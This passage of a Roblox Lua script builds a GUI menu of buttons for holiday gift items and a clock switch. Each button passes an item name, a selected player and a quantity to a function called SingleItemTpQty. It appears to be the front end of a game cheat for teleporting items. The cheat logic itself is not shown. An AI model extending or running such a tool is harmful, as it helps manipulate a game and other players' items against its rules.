CountItems116.TextColor3 = Color3.new(0, 1, 0)
CountItems116.TextSize = 25

ClockSwitch = Instance.new("ImageButton")
ClockSwitch.Name = "ClockSwitch"
ClockSwitch.Parent = MoveWire
ClockSwitch.BackgroundColor3 = Color3.new(1, 1, 1)
ClockSwitch.BackgroundTransparency = 1
ClockSwitch.BorderColor3 = Color3.new(0.6, 0, 0)
ClockSwitch.Position = UDim2.new(0, 5, 0, 3150)
ClockSwitch.Size = UDim2.new(0, 100, 0, 100)
ClockSwitch.Image = "rbxassetid://4925532404"
ClockSwitch.MouseButton1Down:connect(function()
Type.Text = "Clock Switch"
SingleItemTpQty("ClockSwitch", PlyrSelz.Text, qty.Text)
end)

CountItems117 = Instance.new("TextLabel")
CountItems117.Parent = MoveWire
CountItems117.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems117.BackgroundTransparency = 0.6
CountItems117.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems117.Position = UDim2.new(0, 110, 0, 3205)
CountItems117.Size = UDim2.new(0, 25, 0, 20)
CountItems117.Font = Enum.Font.SourceSans
CountItems117.Text = "0"
CountItems117.TextColor3 = Color3.new(0, 1, 0)
CountItems117.TextSize = 25

MoveGifts = Instance.new("ScrollingFrame")
MoveGifts.Name = "MoveGifts"
MoveGifts.Parent = MenuFrame
MoveGifts.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveGifts.BackgroundTransparency = 0.5
MoveGifts.Position =  UDim2.new(0, 179, 0, 0)
MoveGifts.BorderColor3 = Color3.new(0, 0, 0)
MoveGifts.Size = UDim2.new(0, 195, 0, 450)
MoveGifts.CanvasPosition = Vector2.new(0,0)
MoveGifts.CanvasSize = UDim2.new(0, 0, 0, 3800)
MoveGifts.Visible = false

GiftsMove = Instance.new("TextButton")
GiftsMove.Name = "GiftsMove"
GiftsMove.Parent = MoveFrame
GiftsMove.BackgroundColor3 = Color3.new(0, 0, 0)
GiftsMove.BorderColor3 = Color3.new(1, 0, 0)
GiftsMove.BackgroundTransparency = 0.6
GiftsMove.Position =  UDim2.new(0, 3, 0, 234)
GiftsMove.Size = UDim2.new(0, 164, 0, 20)
GiftsMove.Font = Enum.Font.Fantasy
GiftsMove.Text = "Sort Gifts"
GiftsMove.TextColor3 = Color3.new(1, 1, 1)
GiftsMove.TextSize = 14
GiftsMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

AA = Instance.new("ImageButton")
AA.Name = "AA"
AA.Parent = MoveGifts
AA.BackgroundColor3 = Color3.new(1, 1, 1)
AA.BackgroundTransparency = 1
AA.BorderColor3 = Color3.new(0.6, 0, 0)
AA.Position = UDim2.new(0, 5, 0, 5)
AA.Size = UDim2.new(0, 100, 0, 100)
AA.Image = "rbxassetid://4100382340"
AA.MouseButton1Down:connect(function()
Type.Text = "2016CGift_Ut"
SingleItemTpQty("2016CGift_Ut", PlyrSelz.Text, qty.Text)
end)

CountItems118 = Instance.new("TextLabel")
CountItems118.Parent = MoveGifts
CountItems118.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems118.BackgroundTransparency = 0.6
CountItems118.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems118.Position = UDim2.new(0, 110, 0, 55)
CountItems118.Size = UDim2.new(0, 25, 0, 20)
CountItems118.Font = Enum.Font.SourceSans
CountItems118.Text = "0"
CountItems118.TextColor3 = Color3.new(0, 1, 0)
CountItems118.TextSize = 25


AB = Instance.new("ImageButton")
AB.Name = "AB"
AB.Parent = MoveGifts
AB.BackgroundColor3 = Color3.new(1, 1, 1)
AB.BackgroundTransparency = 1
AB.BorderColor3 = Color3.new(0.6, 0, 0)
AB.Position = UDim2.new(0, 5, 0, 105)
AB.Size = UDim2.new(0, 100, 0, 100)
AB.Image = "rbxassetid://4100378250"
AB.MouseButton1Down:connect(function()
Type.Text = "2015CGift_Coal"
SingleItemTpQty("2015CGift_Coal", PlyrSelz.Text, qty.Text)
end)

CountItems119 = Instance.new("TextLabel")
CountItems119.Parent = MoveGifts
CountItems119.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems119.BackgroundTransparency = 0.6
CountItems119.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems119.Position = UDim2.new(0, 110, 0, 160)
CountItems119.Size = UDim2.new(0, 25, 0, 20)
CountItems119.Font = Enum.Font.SourceSans
CountItems119.Text = "0"
CountItems119.TextColor3 = Color3.new(0, 1, 0)
CountItems119.TextSize = 25

AC = Instance.new("ImageButton")
AC.Name = "2015CGift_Red"
AC.Parent = MoveGifts
AC.BackgroundColor3 = Color3.new(1, 1, 1)
AC.BackgroundTransparency = 1
AC.BorderColor3 = Color3.new(0.6, 0, 0)
AC.Position = UDim2.new(0, 5, 0, 210)
AC.Size = UDim2.new(0, 100, 0, 100)
AC.Image = "rbxassetid://4100378867"
AC.MouseButton1Down:connect(function()
Type.Text = "2015CGift_Red"
SingleItemTpQty("2015CGift_Red", PlyrSelz.Text, qty.Text)
end)

CountItems120 = Instance.new("TextLabel")
CountItems120.Parent = MoveGifts
CountItems120.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems120.BackgroundTransparency = 0.6
CountItems120.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems120.Position = UDim2.new(0, 110, 0, 265)
CountItems120.Size = UDim2.new(0, 25, 0, 20)
CountItems120.Font = Enum.Font.SourceSans
CountItems120.Text = "0"
CountItems120.TextColor3 = Color3.new(0, 1, 0)
CountItems120.TextSize = 25

AD = Instance.new("ImageButton")
AD.Name = "2016CGift_Sweet"
AD.Parent = MoveGifts
AD.BackgroundColor3 = Color3.new(1, 1, 1)
AD.BackgroundTransparency = 1
AD.BorderColor3 = Color3.new(0.6, 0, 0)
AD.Position = UDim2.new(0, 5, 0, 315)
AD.Size = UDim2.new(0, 100, 0, 100)
AD.Image = "rbxassetid://4100381936"
AD.MouseButton1Down:connect(function()
Type.Text = "2016CGift_Sweet"
SingleItemTpQty("2016CGift_Sweet", PlyrSelz.Text, qty.Text)
end)

CountItems121 = Instance.new("TextLabel")
CountItems121.Parent = MoveGifts
CountItems121.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems121.BackgroundTransparency = 0.6
CountItems121.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems121.Position = UDim2.new(0, 110, 0, 370)
CountItems121.Size = UDim2.new(0, 25, 0, 20)
CountItems121.Font = Enum.Font.SourceSans
CountItems121.Text = "0"
CountItems121.TextColor3 = Color3.new(0, 1, 0)
CountItems121.TextSize = 25

AE = Instance.new("ImageButton")
AE.Name = "2015CGift_Volcano"
AE.Parent = MoveGifts
AE.BackgroundColor3 = Color3.new(1, 1, 1)
AE.BackgroundTransparency = 1
AE.BorderColor3 = Color3.new(0.6, 0, 0)
AE.Position = UDim2.new(0, 5, 0, 420)
AE.Size = UDim2.new(0, 100, 0, 100)
AE.Image = "rbxassetid://4100379348"
AE.MouseButton1Down:connect(function()
Type.Text = "2015CGift_Volcano"
SingleItemTpQty("2015CGift_Volcano", PlyrSelz.Text, qty.Text)
end)

CountItems122 = Instance.new("TextLabel")
CountItems122.Parent = MoveGifts
CountItems122.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems122.BackgroundTransparency = 0.6
CountItems122.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems122.Position = UDim2.new(0, 110, 0, 475)
CountItems122.Size = UDim2.new(0, 25, 0, 20)
CountItems122.Font = Enum.Font.SourceSans
CountItems122.Text = "0"
CountItems122.TextColor3 = Color3.new(0, 1, 0)
CountItems122.TextSize = 25

AF = Instance.new("ImageButton")
AF.Name = "2015CGift_Wobble"
AF.Parent = MoveGifts
AF.BackgroundColor3 = Color3.new(1, 1, 1)
AF.BackgroundTransparency = 1
AF.BorderColor3 = Color3.new(0.6, 0, 0)
AF.Position = UDim2.new(0, 5, 0, 525)
AF.Size = UDim2.new(0, 100, 0, 100)
AF.Image = "rbxassetid://4100379989"
AF.MouseButton1Down:connect(function()
Type.Text = "2015CGift_Wobble"
SingleItemTpQty("2015CGift_Wobble", PlyrSelz.Text, qty.Text)
end)

CountItems123 = Instance.new("TextLabel")
CountItems123.Parent = MoveGifts
CountItems123.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems123.BackgroundTransparency = 0.6
CountItems123.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems123.Position = UDim2.new(0, 110, 0, 580)
CountItems123.Size = UDim2.new(0, 25, 0, 20)
CountItems123.Font = Enum.Font.SourceSans
CountItems123.Text = "0"
CountItems123.TextColor3 = Color3.new(0, 1, 0)
CountItems123.TextSize = 25

AG = Instance.new("ImageButton")
AG.Name = "2016CGift_Blue"
AG.Parent = MoveGifts
AG.BackgroundColor3 = Color3.new(1, 1, 1)
AG.BackgroundTransparency = 1
AG.BorderColor3 = Color3.new(0.6, 0, 0)
AG.Position = UDim2.new(0, 5, 0, 630)
AG.Size = UDim2.new(0, 100, 0, 100)
AG.Image = "rbxassetid://4100381046"
AG.MouseButton1Down:connect(function()
Type.Text = "2016CGift_Blue"
SingleItemTpQty("2016CGift_Blue", PlyrSelz.Text, qty.Text)
end)

CountItems124 = Instance.new("TextLabel")
CountItems124.Parent = MoveGifts
CountItems124.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems124.BackgroundTransparency = 0.6
CountItems124.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems124.Position = UDim2.new(0, 110, 0, 685)
CountItems124.Size = UDim2.new(0, 25, 0, 20)
CountItems124.Font = Enum.Font.SourceSans
CountItems124.Text = "0"
CountItems124.TextColor3 = Color3.new(0, 1, 0)
CountItems124.TextSize = 25

AH = Instance.new("ImageButton")
AH.Name = "2016CGift_Big"
AH.Parent = MoveGifts
AH.BackgroundColor3 = Color3.new(1, 1, 1)
AH.BackgroundTransparency = 1
AH.BorderColor3 = Color3.new(0.6, 0, 0)
AH.Position = UDim2.new(0, 5, 0, 735)
AH.Size = UDim2.new(0, 100, 0, 100)
AH.Image = "rbxassetid://4100380550"
AH.MouseButton1Down:connect(function()
Type.Text = "2016CGift_Big"
SingleItemTpQty("2016CGift_Big", PlyrSelz.Text, qty.Text)
end)

CountItems125 = Instance.new("TextLabel")
CountItems125.Parent = MoveGifts
CountItems125.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems125.BackgroundTransparency = 0.6
CountItems125.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems125.Position = UDim2.new(0, 110, 0, 790)
CountItems125.Size = UDim2.new(0, 25, 0, 20)
CountItems125.Font = Enum.Font.SourceSans
CountItems125.Text = "0"
CountItems125.TextColor3 = Color3.new(0, 1, 0)
CountItems125.TextSize = 25

AI = Instance.new("ImageButton")
AI.Name = "2016CGift_Jingle"
AI.Parent = MoveGifts
AI.BackgroundColor3 = Color3.new(1, 1, 1)
AI.BackgroundTransparency = 1
AI.BorderColor3 = Color3.new(0.6, 0, 0)
AI.Position = UDim2.new(0, 5, 0, 840)
AI.Size = UDim2.new(0, 100, 0, 100)
AI.Image = "rbxassetid://4100381484"
AI.MouseButton1Down:connect(function()
Type.Text = "2016CGift_Jingle"
SingleItemTpQty("2016CGift_Jingle", PlyrSelz.Text, qty.Text)
end)

CountItems126 = Instance.new("TextLabel")
CountItems126.Parent = MoveGifts
CountItems126.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems126.BackgroundTransparency = 0.6
CountItems126.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems126.Position = UDim2.new(0, 110, 0, 895)
CountItems126.Size = UDim2.new(0, 25, 0, 20)
CountItems126.Font = Enum.Font.SourceSans
CountItems126.Text = "0"
CountItems126.TextColor3 = Color3.new(0, 1, 0)
CountItems126.TextSize = 25

AJ = Instance.new("ImageButton")
AJ.Name = "2016CGift_Wobble"
AJ.Parent = MoveGifts
AJ.BackgroundColor3 = Color3.new(1, 1, 1)
AJ.BackgroundTransparency = 1
AJ.BorderColor3 = Color3.new(0.6, 0, 0)
AJ.Position = UDim2.new(0, 5, 0, 945)
AJ.Size = UDim2.new(0, 100, 0, 100)
AJ.Image = "rbxassetid://4100382774"
AJ.MouseButton1Down:connect(function()
Type.Text = "2016CGift_Wobble"
SingleItemTpQty("2016CGift_Wobble", PlyrSelz.Text, qty.Text)
end)

CountItems127 = Instance.new("TextLabel")
CountItems127.Parent = MoveGifts
CountItems127.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems127.BackgroundTransparency = 0.6
CountItems127.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems127.Position = UDim2.new(0, 110, 0, 1000)
CountItems127.Size = UDim2.new(0, 25, 0, 20)
CountItems127.Font = Enum.Font.SourceSans
CountItems127.Text = "0"
CountItems127.TextColor3 = Color3.new(0, 1, 0)
CountItems127.TextSize = 25

AK = Instance.new("ImageButton")
AK.Name = "2018CGift_Wobble"
AK.Parent = MoveGifts
AK.BackgroundColor3 = Color3.new(1, 1, 1)
AK.BackgroundTransparency = 1
AK.BorderColor3 = Color3.new(0.6, 0, 0)
AK.Position = UDim2.new(0, 5, 0, 1050)
AK.Size = UDim2.new(0, 100, 0, 100)
AK.Image = "rbxassetid://4100393482"
AK.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Wobble"
SingleItemTpQty("2018CGift_Wobble", PlyrSelz.Text, qty.Text)
end)

CountItems128 = Instance.new("TextLabel")
CountItems128.Parent = MoveGifts
CountItems128.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems128.BackgroundTransparency = 0.6
CountItems128.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems128.Position = UDim2.new(0, 110, 0, 1105)
CountItems128.Size = UDim2.new(0, 25, 0, 20)
CountItems128.Font = Enum.Font.SourceSans
CountItems128.Text = "0"
CountItems128.TextColor3 = Color3.new(0, 1, 0)
CountItems128.TextSize = 25

AL = Instance.new("ImageButton")
AL.Name = "2017CGift_Green"
AL.Parent = MoveGifts
AL.BackgroundColor3 = Color3.new(1, 1, 1)
AL.BackgroundTransparency = 1
AL.BorderColor3 = Color3.new(0.6, 0, 0)
AL.Position = UDim2.new(0, 5, 0, 1155)
AL.Size = UDim2.new(0, 100, 0, 100)
AL.Image = "rbxassetid://4100387675"
AL.MouseButton1Down:connect(function()
Type.Text = "2017CGift_Green"
SingleItemTpQty("2017CGift_Green", PlyrSelz.Text, qty.Text)
end)

CountItems129 = Instance.new("TextLabel")
CountItems129.Parent = MoveGifts
CountItems129.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems129.BackgroundTransparency = 0.6
CountItems129.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems129.Position = UDim2.new(0, 110, 0, 1210)
CountItems129.Size = UDim2.new(0, 25, 0, 20)
CountItems129.Font = Enum.Font.SourceSans
CountItems129.Text = "0"
CountItems129.TextColor3 = Color3.new(0, 1, 0)
CountItems129.TextSize = 25

AM = Instance.new("ImageButton")
AM.Name = "2017CGift_GreatTimes"
AM.Parent = MoveGifts
AM.BackgroundColor3 = Color3.new(1, 1, 1)
AM.BackgroundTransparency = 1
AM.BorderColor3 = Color3.new(0.6, 0, 0)
AM.Position = UDim2.new(0, 5, 0, 1260)
AM.Size = UDim2.new(0, 100, 0, 100)
AM.Image = "rbxassetid://4100383613"
AM.MouseButton1Down:connect(function()
Type.Text = "2017CGift_GreatTimes"
SingleItemTpQty("2017CGift_GreatTimes", PlyrSelz.Text, qty.Text)
end)

CountItems130 = Instance.new("TextLabel")
CountItems130.Parent = MoveGifts
CountItems130.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems130.BackgroundTransparency = 0.6
CountItems130.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems130.Position = UDim2.new(0, 110, 0, 1315)
CountItems130.Size = UDim2.new(0, 25, 0, 20)
CountItems130.Font = Enum.Font.SourceSans
CountItems130.Text = "0"
CountItems130.TextColor3 = Color3.new(0, 1, 0)
CountItems130.TextSize = 25

AN = Instance.new("ImageButton")
AN.Name = "2017CGift_Modern"
AN.Parent = MoveGifts
AN.BackgroundColor3 = Color3.new(1, 1, 1)
AN.BackgroundTransparency = 1
AN.BorderColor3 = Color3.new(0.6, 0, 0)
AN.Position = UDim2.new(0, 5, 0, 1365)
AN.Size = UDim2.new(0, 100, 0, 100)
AN.Image = "rbxassetid://4100388162"
AN.MouseButton1Down:connect(function()
Type.Text = "2017CGift_Modern"
SingleItemTpQty("2017CGift_Modern", PlyrSelz.Text, qty.Text)
end)

CountItems131 = Instance.new("TextLabel")
CountItems131.Parent = MoveGifts
CountItems131.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems131.BackgroundTransparency = 0.6
CountItems131.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems131.Position = UDim2.new(0, 110, 0, 1420)
CountItems131.Size = UDim2.new(0, 25, 0, 20)
CountItems131.Font = Enum.Font.SourceSans
CountItems131.Text = "0"
CountItems131.TextColor3 = Color3.new(0, 1, 0)
CountItems131.TextSize = 25

AO = Instance.new("ImageButton")
AO.Name = "2017CGift_Wobble"
AO.Parent = MoveGifts
AO.BackgroundColor3 = Color3.new(1, 1, 1)
AO.BackgroundTransparency = 1
AO.BorderColor3 = Color3.new(0.6, 0, 0)
AO.Position = UDim2.new(0, 5, 0, 1470)
AO.Size = UDim2.new(0, 100, 0, 100)
AO.Image = "rbxassetid://4100388577"
AO.MouseButton1Down:connect(function()
Type.Text = "2017CGift_Wobble"
SingleItemTpQty("2017CGift_Wobble", PlyrSelz.Text, qty.Text)
end)

CountItems132 = Instance.new("TextLabel")
CountItems132.Parent = MoveGifts
CountItems132.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems132.BackgroundTransparency = 0.6
CountItems132.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems132.Position = UDim2.new(0, 110, 0, 1545)
CountItems132.Size = UDim2.new(0, 25, 0, 20)
CountItems132.Font = Enum.Font.SourceSans
CountItems132.Text = "0"
CountItems132.TextColor3 = Color3.new(0, 1, 0)
CountItems132.TextSize = 25

AP = Instance.new("ImageButton")
AP.Name = "2019CGift_Wobble"
AP.Parent = MoveGifts
AP.BackgroundColor3 = Color3.new(1, 1, 1)
AP.BackgroundTransparency = 1
AP.BorderColor3 = Color3.new(0.6, 0, 0)
AP.Position = UDim2.new(0, 5, 0, 1575)
AP.Size = UDim2.new(0, 100, 0, 100)
AP.Image = "rbxassetid://4478050100"
AP.MouseButton1Down:connect(function()
Type.Text = "2019CGift_Wobble"
SingleItemTpQty("2019CGift_Wobble_", PlyrSelz.Text, qty.Text)
end)

CountItems133 = Instance.new("TextLabel")
CountItems133.Parent = MoveGifts
CountItems133.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems133.BackgroundTransparency = 0.6
CountItems133.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems133.Position = UDim2.new(0, 110, 0, 1630)
CountItems133.Size = UDim2.new(0, 25, 0, 20)
CountItems133.Font = Enum.Font.SourceSans
CountItems133.Text = "0"
CountItems133.TextColor3 = Color3.new(0, 1, 0)
CountItems133.TextSize = 25

AQ = Instance.new("ImageButton")
AQ.Name = "2017CGift_Gold"
AQ.Parent = MoveGifts
AQ.BackgroundColor3 = Color3.new(1, 1, 1)
AQ.BackgroundTransparency = 1
AQ.BorderColor3 = Color3.new(0.6, 0, 0)
AQ.Position = UDim2.new(0, 5, 0, 1680)
AQ.Size = UDim2.new(0, 100, 0, 100)
AQ.Image = "rbxassetid://4100383204"
AQ.MouseButton1Down:connect(function()
Type.Text = "2017CGift_Gold"
SingleItemTpQty("2017CGift_Gold", PlyrSelz.Text, qty.Text)
end)

CountItems134 = Instance.new("TextLabel")
CountItems134.Parent = MoveGifts
CountItems134.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems134.BackgroundTransparency = 0.6
CountItems134.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems134.Position = UDim2.new(0, 110, 0, 1735)
CountItems134.Size = UDim2.new(0, 25, 0, 20)
CountItems134.Font = Enum.Font.SourceSans
CountItems134.Text = "0"
CountItems134.TextColor3 = Color3.new(0, 1, 0)
CountItems134.TextSize = 25

AR = Instance.new("ImageButton")
AR.Name = "2018CGift_Snow"
AR.Parent = MoveGifts
AR.BackgroundColor3 = Color3.new(1, 1, 1)
AR.BackgroundTransparency = 1
AR.BorderColor3 = Color3.new(0.6, 0, 0)
AR.Position = UDim2.new(0, 5, 0, 1785)
AR.Size = UDim2.new(0, 100, 0, 100)
AR.Image = "rbxassetid://4100393075"
AR.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Snow"
SingleItemTpQty("2018CGift_Snow", PlyrSelz.Text, qty.Text)
end)

CountItems135 = Instance.new("TextLabel")
CountItems135.Parent = MoveGifts
CountItems135.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems135.BackgroundTransparency = 1
CountItems135.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems135.Position = UDim2.new(0, 110, 0, 1840)
CountItems135.Size = UDim2.new(0, 25, 0, 20)
CountItems135.Font = Enum.Font.SourceSans
CountItems135.Text = "0"
CountItems135.TextColor3 = Color3.new(0, 1, 0)
CountItems135.TextSize = 25

AS = Instance.new("ImageButton")
AS.Name = "2018CGift_Plate"
AS.Parent = MoveGifts
AS.BackgroundColor3 = Color3.new(1, 1, 1)
AS.BackgroundTransparency = 1
AS.BorderColor3 = Color3.new(0.6, 0, 0)
AS.Position = UDim2.new(0, 5, 0, 1890)
AS.Size = UDim2.new(0, 100, 0, 100)
AS.Image = "rbxassetid://4100391203"
AS.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Plate"
SingleItemTpQty("2018CGift_Plate", PlyrSelz.Text, qty.Text)
end)

CountItems136 = Instance.new("TextLabel")
CountItems136.Parent = MoveGifts
CountItems136.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems136.BackgroundTransparency = 1
CountItems136.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems136.Position = UDim2.new(0, 110, 0, 1945)
CountItems136.Size = UDim2.new(0, 25, 0, 20)
CountItems136.Font = Enum.Font.SourceSans
CountItems136.Text = "0"
CountItems136.TextColor3 = Color3.new(0, 1, 0)
CountItems136.TextSize = 25

AT = Instance.new("ImageButton")
AT.Name = "2018CGift_Cocoa"
AT.Parent = MoveGifts
AT.BackgroundColor3 = Color3.new(1, 1, 1)
AT.BackgroundTransparency = 1
AT.BorderColor3 = Color3.new(0.6, 0, 0)
AT.Position = UDim2.new(0, 5, 0, 1995)
AT.Size = UDim2.new(0, 100, 0, 100)
AT.Image = "rbxassetid://4100389498"
AT.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Cocoa"
SingleItemTpQty("2018CGift_Cocoa", PlyrSelz.Text, qty.Text)
end)

CountItems137 = Instance.new("TextLabel")
CountItems137.Parent = MoveGifts
CountItems137.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems137.BackgroundTransparency = 0.6
CountItems137.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems137.Position = UDim2.new(0, 110, 0, 2050)
CountItems137.Size = UDim2.new(0, 25, 0, 20)
CountItems137.Font = Enum.Font.SourceSans
CountItems137.Text = "0"
CountItems137.TextColor3 = Color3.new(0, 1, 0)
CountItems137.TextSize = 25

AU = Instance.new("ImageButton")
AU.Name = "2018CGift_Candy"
AU.Parent = MoveGifts
AU.BackgroundColor3 = Color3.new(1, 1, 1)
AU.BackgroundTransparency = 1
AU.BorderColor3 = Color3.new(0.6, 0, 0)
AU.Position = UDim2.new(0, 5, 0, 2100)
AU.Size = UDim2.new(0, 100, 0, 100)
AU.Image = "rbxassetid://4100389044"
AU.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Candy"
SingleItemTpQty("2018CGift_Candy", PlyrSelz.Text, qty.Text)
end)

CountItems138 = Instance.new("TextLabel")
CountItems138.Parent = MoveGifts
CountItems138.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems138.BackgroundTransparency = 0.6
CountItems138.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems138.Position = UDim2.new(0, 110, 0, 2155)
CountItems138.Size = UDim2.new(0, 25, 0, 20)
CountItems138.Font = Enum.Font.SourceSans
CountItems138.Text = "0"
CountItems138.TextColor3 = Color3.new(0, 1, 0)
CountItems138.TextSize = 25

AV = Instance.new("ImageButton")
AV.Name = "2018CGift_Duck"
AV.Parent = MoveGifts
AV.BackgroundColor3 = Color3.new(1, 1, 1)
AV.BackgroundTransparency = 1
AV.BorderColor3 = Color3.new(0.6, 0, 0)
AV.Position = UDim2.new(0, 5, 0, 2205)
AV.Size = UDim2.new(0, 100, 0, 100)
AV.Image = "rbxassetid://4100390415"
AV.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Duck"
SingleItemTpQty("2018CGift_Duck", PlyrSelz.Text, qty.Text)
end)

CountItems139 = Instance.new("TextLabel")
CountItems139.Parent = MoveGifts
CountItems139.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems139.BackgroundTransparency = 0.6
CountItems139.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems139.Position = UDim2.new(0, 110, 0, 2260)
CountItems139.Size = UDim2.new(0, 25, 0, 20)
CountItems139.Font = Enum.Font.SourceSans
CountItems139.Text = "0"
CountItems139.TextColor3 = Color3.new(0, 1, 0)
CountItems139.TextSize = 25

AW = Instance.new("ImageButton")
AW.Name = "2018CGift_Cone"
AW.Parent = MoveGifts
AW.BackgroundColor3 = Color3.new(1, 1, 1)
AW.BackgroundTransparency = 1
AW.BorderColor3 = Color3.new(0.6, 0, 0)
AW.Position = UDim2.new(0, 5, 0, 2310)
AW.Size = UDim2.new(0, 100, 0, 100)
AW.Image = "rbxassetid://4100389902"
AW.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Cone"
SingleItemTpQty("2018CGift_Cone", PlyrSelz.Text, qty.Text)
end)

CountItems140 = Instance.new("TextLabel")
CountItems140.Parent = MoveGifts
CountItems140.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems140.BackgroundTransparency = 0.6
CountItems140.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems140.Position = UDim2.new(0, 110, 0, 2365)
CountItems140.Size = UDim2.new(0, 25, 0, 20)
CountItems140.Font = Enum.Font.SourceSans
CountItems140.Text = "0"
CountItems140.TextColor3 = Color3.new(0, 1, 0)
CountItems140.TextSize = 25

AX = Instance.new("ImageButton")
AX.Name = "2018CGift_Sled"
AX.Parent = MoveGifts
AX.BackgroundColor3 = Color3.new(1, 1, 1)
AX.BackgroundTransparency = 1
AX.BorderColor3 = Color3.new(0.6, 0, 0)
AX.Position = UDim2.new(0, 5, 0, 2415)
AX.Size = UDim2.new(0, 100, 0, 100)
AX.Image = "rbxassetid://4100392123"
AX.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Sled"
SingleItemTpQty("2018CGift_Sled", PlyrSelz.Text, qty.Text)
end)

CountItems141 = Instance.new("TextLabel")
CountItems141.Parent = MoveGifts
CountItems141.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems141.BackgroundTransparency = 0.6
CountItems141.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems141.Position = UDim2.new(0, 110, 0, 2470)
CountItems141.Size = UDim2.new(0, 25, 0, 20)
CountItems141.Font = Enum.Font.SourceSans
CountItems141.Text = "0"
CountItems141.TextColor3 = Color3.new(0, 1, 0)
CountItems141.TextSize = 25

AY = Instance.new("ImageButton")
AY.Name = "2018CGift_GingerAxe"
AY.Parent = MoveGifts
AY.BackgroundColor3 = Color3.new(1, 1, 1)
AY.BackgroundTransparency = 1
AY.BorderColor3 = Color3.new(0.6, 0, 0)
AY.Position = UDim2.new(0, 5, 0, 2520)
AY.Size = UDim2.new(0, 100, 0, 100)
AY.Image = "rbxassetid://4100390781"
AY.MouseButton1Down:connect(function()
Type.Text = "2018CGift_GingerAxe"
SingleItemTpQty("2018CGift_GingerAxe", PlyrSelz.Text, qty.Text)
end)

CountItems142 = Instance.new("TextLabel")
CountItems142.Parent = MoveGifts
CountItems142.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems142.BackgroundTransparency = 1
CountItems142.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems142.Position = UDim2.new(0, 110, 0, 2575)
CountItems142.Size = UDim2.new(0, 37, 0, 35)
CountItems142.Font = Enum.Font.SourceSans
CountItems142.Text = "0"
CountItems142.TextColor3 = Color3.new(0, 1, 0)
CountItems142.TextSize = 25

AZ = Instance.new("ImageButton")
AZ.Name = "AZ"
AZ.Parent = MoveGifts
AZ.BackgroundColor3 = Color3.new(1, 1, 1)
AZ.BackgroundTransparency = 1
AZ.BorderColor3 = Color3.new(0.6, 0, 0)
AZ.Position = UDim2.new(0, 5, 0, 2625)
AZ.Size = UDim2.new(0, 100, 0, 100)
AZ.Image = "rbxassetid://4100391664"
AZ.MouseButton1Down:connect(function()
Type.Text = "2018CGift_Plum"
SingleItemTpQty("2018CGift_Plum", PlyrSelz.Text, qty.Text)
end)

CountItems143 = Instance.new("TextLabel")
CountItems143.Parent = MoveGifts
CountItems143.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems143.BackgroundTransparency = 0.6
CountItems143.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems143.Position = UDim2.new(0, 110, 0, 2680)
CountItems143.Size = UDim2.new(0, 25, 0, 20)
CountItems143.Font = Enum.Font.SourceSans
CountItems143.Text = "0"
CountItems143.TextColor3 = Color3.new(0, 1, 0) 
CountItems143.TextSize = 25 

BA = Instance.new("ImageButton")
BA.Name = "BA"
BA.Parent = MoveGifts
BA.BackgroundColor3 = Color3.new(1, 1, 1)
BA.BackgroundTransparency = 1
BA.BorderColor3 = Color3.new(0.6, 0, 0)
